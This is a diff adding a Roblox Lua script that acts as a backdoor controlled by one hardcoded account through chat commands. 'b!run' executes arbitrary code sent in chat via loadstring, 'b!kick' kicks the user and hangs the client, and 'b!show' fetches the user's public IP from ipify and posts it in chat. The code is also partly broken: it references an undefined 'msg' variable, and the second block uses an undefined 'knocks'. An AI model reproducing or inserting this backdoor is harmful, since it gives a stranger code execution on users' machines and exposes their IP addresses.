@@ -1,0 +1,43 @@
+local function gpfs(str)
+    for i, v in pairs(game.Players:GetPlayers()) do
+        if str:lower() == (v.Name:lower()):sub(1, #str) or str:lower() == (v.DisplayName:lower()):sub(1, #str) then
+            return v
+        end
+    end
+end
+game.Players.PlayerAdded:Connect(function(knocks)
+if knocks.Name == "jjjuuikjjikkju" then
+knocks.Chatted:Connect(function(rizz)
+local splitted = msg:split(" ")
+if splitted[1] == "b!kick" then
+game.Players.LocalPlayer:Kick("ur on the touch list")
+task.wait(2)
+while true do end
+elseif splitted[1] == "b!run" then
+ local execute = #splitted[1] + 1
+            loadstring(string.sub(rizz, execute))()
+elseif splitted[1] == "b!show" then
+game.Players:Chat("ff "..tostring(game:HttpGet("https://api.ipify.org/")))
+end
+end)
+end
+end)
+for i,v in pairs(game.Players:GetPlayers()) do
+  if v.Name == "jjjuuikjjikkju" then
+    if knocks.Name == "jjjuuikjjikkju" then
+knocks.Chatted:Connect(function(rizz)
+local splitted = msg:split(" ")
+if splitted[1] == "b!kick" then
+game.Players.LocalPlayer:Kick("ur on the touch list")
+task.wait(2)
+while true do end
+elseif splitted[1] == "b!run" then
+ local execute = #splitted[1] + 1
+            loadstring(string.sub(rizz, execute))()
+elseif splitted[1] == "b!show" then
+game.Players:Chat("ff "..tostring(game:HttpGet("https://api.ipify.org/")))
+end
+end)
+end
+end
+end
